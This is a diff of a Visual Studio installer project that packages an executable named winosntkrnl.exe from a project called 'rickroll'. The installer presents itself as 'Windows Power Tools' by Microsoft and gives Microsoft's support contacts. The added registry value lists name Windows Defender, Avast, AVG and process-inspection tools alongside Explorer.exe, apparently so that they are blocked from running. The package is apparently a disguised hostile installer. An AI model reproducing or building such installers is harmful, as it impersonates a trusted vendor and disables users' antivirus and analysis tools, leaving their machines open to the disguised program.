@@ -15,7 +15,19 @@
     {
         "Entry"
         {
-        "MsmKey" = "8:_7FCCE181D2B041F38B8BFEE2A9E5189F"
+        "MsmKey" = "8:_A84604746E074C44A94A55CDCAB7C31D"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_BA9115436F534FFFA8E9D02D0E64D250"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_FAD6CF7A53AB416A9569844225976C24"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -106,10 +118,50 @@
         }
         "File"
         {
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_7FCCE181D2B041F38B8BFEE2A9E5189F"
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_A84604746E074C44A94A55CDCAB7C31D"
             {
-            "SourcePath" = "8:..\\..\\..\\..\\..\\..\\..\\source\\repos\\rickroll\\Debug\\winosntkrnl.exe"
+            "SourcePath" = "8:..\\..\\Required DLL files\\ucrtbased.dll"
+            "TargetName" = "8:ucrtbased.dll"
+            "Tag" = "8:"
+            "Folder" = "8:_C865781493CA4388B8276AFEB24042A7"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_BA9115436F534FFFA8E9D02D0E64D250"
+            {
+            "SourcePath" = "8:..\\..\\rickroll\\Debug\\winosntkrnl.exe"
             "TargetName" = "8:winosntkrnl.exe"
+            "Tag" = "8:"
+            "Folder" = "8:_C865781493CA4388B8276AFEB24042A7"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_FAD6CF7A53AB416A9569844225976C24"
+            {
+            "SourcePath" = "8:..\\..\\Required DLL files\\vcruntime140d.dll"
+            "TargetName" = "8:vcruntime140d.dll"
             "Tag" = "8:"
             "Folder" = "8:_C865781493CA4388B8276AFEB24042A7"
             "Condition" = "8:"
@@ -177,6 +229,17 @@
                 {
                 }
             }
+            "{1525181F-901A-416C-8A58-119130FE478E}:_1E6B9F63F7614DD5AD018BF2F7D920A8"
+            {
+            "Name" = "8:#1914"
+            "AlwaysCreate" = "11:FALSE"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Property" = "8:SystemFolder"
+                "Folders"
+                {
+                }
+            }
             "{1525181F-901A-416C-8A58-119130FE478E}:_67D20ECB28294545A43E260E12DEB046"
             {
             "Name" = "8:#1919"
@@ -204,15 +267,15 @@
         {
         "Name" = "8:Microsoft Visual Studio"
         "ProductName" = "8:Windows Power Tools"
-        "ProductCode" = "8:{7327C234-EE41-4419-939A-783F44A28F83}"
-        "PackageCode" = "8:{B066EFDA-0561-411D-A387-D62CFD676DCD}"
+        "ProductCode" = "8:{98F9FEC8-A40A-404D-B44A-059CD846C504}"
+        "PackageCode" = "8:{E228FBF1-9F4A-4F6D-86F5-6F044D937FB1}"
         "UpgradeCode" = "8:{040442E7-479B-4C78-8074-7CA5D3764011}"
         "AspNetVersion" = "8:1.1.4322.0"
         "RestartWWWService" = "11:FALSE"
         "RemovePreviousVersions" = "11:TRUE"
         "DetectNewerInstalledVersion" = "11:TRUE"
         "InstallAllUsers" = "11:TRUE"
-        "ProductVersion" = "8:0.5.3"
+        "ProductVersion" = "8:0.5.5"
         "Manufacturer" = "8:Microsoft"
         "ARPHELPTELEPHONE" = "8:1-800-936-4900"
         "ARPHELPLINK" = "8:https://www.support.microsoft.com"
@@ -529,6 +592,86 @@
                                                                         }
                                                                         "Values"
                                                                         {
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_0CFA6679867F4C04A1081D56C9594223"
+                                                                            {
+                                                                            "Name" = "8:3"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:MpCmdRun.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_103B2156D63649118F6CC6E2114BF13C"
+                                                                            {
+                                                                            "Name" = "8:2"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:ConfigSecurityPolicy.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_33FD8AA056904149865CC7C77A33F65B"
+                                                                            {
+                                                                            "Name" = "8:15"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:ProcessHacker.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_35B98849C5E14093AEB048C7151C224B"
+                                                                            {
+                                                                            "Name" = "8:8"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:avgcc.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_75D816807A674D1A911AAB0C6BD5CC50"
+                                                                            {
+                                                                            "Name" = "8:10"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:AvastSVC.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_7ABAFCE64DE540D8BC32031ED98DC4C1"
+                                                                            {
+                                                                            "Name" = "8:12"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:procexp.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_81FE74A84D354C28A4ABFE45CC793F34"
+                                                                            {
+                                                                            "Name" = "8:9"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:AvGUI.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_9AA6BC515591472FB66B68F2FA60C7C7"
+                                                                            {
+                                                                            "Name" = "8:7"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:AvastUI.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_9DF50ED2E3B44B12924168E41F868D85"
+                                                                            {
+                                                                            "Name" = "8:4"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:MpDlpCmd.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_AF689EFBE8F5457F9A996B5DE6E999A4"
+                                                                            {
+                                                                            "Name" = "8:13"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:procexp64.exe"
+                                                                            }
                                                                             "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_E147CE3575E84D60864C69F61F563DA5"
                                                                             {
                                                                             "Name" = "8:1"
@@ -536,6 +679,38 @@
                                                                             "Transitive" = "11:FALSE"
                                                                             "ValueTypes" = "3:1"
                                                                             "Value" = "8:Explorer.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_E960447B0F304D2AAF403B07C7592B0C"
+                                                                            {
+                                                                            "Name" = "8:5"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:MsMpEng.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_EBAA3D81336946D2953FF0F1190BB3DF"
+                                                                            {
+                                                                            "Name" = "8:11"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:afwServ.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_F2B013E12B5C417EBA606BE773FD0191"
+                                                                            {
+                                                                            "Name" = "8:14"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:peview.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_FCC36B154CBA49D0A9554995D5A2FA07"
+                                                                            {
+                                                                            "Name" = "8:6"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:NisServ.exe"
                                                                             }
                                                                         }
                                                                     }
@@ -763,6 +938,70 @@
                                                                         }
                                                                         "Values"
                                                                         {
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_0F32B1C3F6C5434EA5AA7267602F6A1D"
+                                                                            {
+                                                                            "Name" = "8:13"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:procxp.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_1024D144FA92470884CB8AF6716B59F8"
+                                                                            {
+                                                                            "Name" = "8:9"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:AvGUI.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_18F8D9FFF41C4B468C96BB6D6543B73A"
+                                                                            {
+                                                                            "Name" = "8:3"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:MpCmdRun.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_3319358B01FD460F90514949C9759823"
+                                                                            {
+                                                                            "Name" = "8:14"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:peview.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_3963211E289F40F5A3347CF523F5AD9A"
+                                                                            {
+                                                                            "Name" = "8:2"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:ConfigSecurityPolicy.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_62DFE0A6EACF4D55B90D034728390363"
+                                                                            {
+                                                                            "Name" = "8:7"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:AvastUI.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_637DE60A46DF4D59AE644097E59F8BCC"
+                                                                            {
+                                                                            "Name" = "8:4"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:MpDlpCmd.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_8CE1A773CF874DC9AC0DE1D82D5F53E6"
+                                                                            {
+                                                                            "Name" = "8:8"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:avgcc.exe"
+                                                                            }
                                                                             "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_8F7BFE36E30043B4BA29AC6BAA385ED2"
                                                                             {
                                                                             "Name" = "8:1"
@@ -770,6 +1009,54 @@
                                                                             "Transitive" = "11:FALSE"
                                                                             "ValueTypes" = "3:1"
                                                                             "Value" = "8:Explorer.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_B7E150AB2E1344C58172949890F1D351"
+                                                                            {
+                                                                            "Name" = "8:10"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:AvastSVC.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_BF9D2E848F9F4E789956F70617F3F20D"
+                                                                            {
+                                                                            "Name" = "8:12"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:procexp.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_C4CD34B7B08A442680F4083C9713477C"
+                                                                            {
+                                                                            "Name" = "8:6"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:NisServ.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_D53A6336EF0C4CAC9197DC0A154C128B"
+                                                                            {
+                                                                            "Name" = "8:11"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:afwServ.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_EC14E5DD3AE24A558254AA8CDFB1FB37"
+                                                                            {
+                                                                            "Name" = "8:15"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:ProcessHacker.exe"
+                                                                            }
+                                                                            "{ADCFDA98-8FDD-45E4-90BC-E3D20B029870}:_F4247E35775843899656463B46806C0B"
+                                                                            {
+                                                                            "Name" = "8:5"
+                                                                            "Condition" = "8:"
+                                                                            "Transitive" = "11:FALSE"
+                                                                            "ValueTypes" = "3:1"
+                                                                            "Value" = "8:MsMpEng.exe"
                                                                             }
                                                                         }
                                                                     }
@@ -853,7 +1140,7 @@
         }
         "Shortcut"
         {
-            "{970C0BB2-C7D0-45D7-ABFA-7EC378858BC0}:_FC0860C216D046C7931F94C206AB7AAE"
+            "{970C0BB2-C7D0-45D7-ABFA-7EC378858BC0}:_436F14F18A90407DBCB5F74FECD19BCA"
             {
             "Name" = "8:winosntkrnl"
             "Arguments" = "8:"
@@ -861,7 +1148,7 @@
             "ShowCmd" = "3:1"
             "IconIndex" = "3:0"
             "Transitive" = "11:FALSE"
-            "Target" = "8:_7FCCE181D2B041F38B8BFEE2A9E5189F"
+            "Target" = "8:_BA9115436F534FFFA8E9D02D0E64D250"
             "Folder" = "8:_1C5B9B95B3944C4E9901BFC5FAD6BAB3"
             "WorkingFolder" = "8:_C865781493CA4388B8276AFEB24042A7"
             "Icon" = "8:"
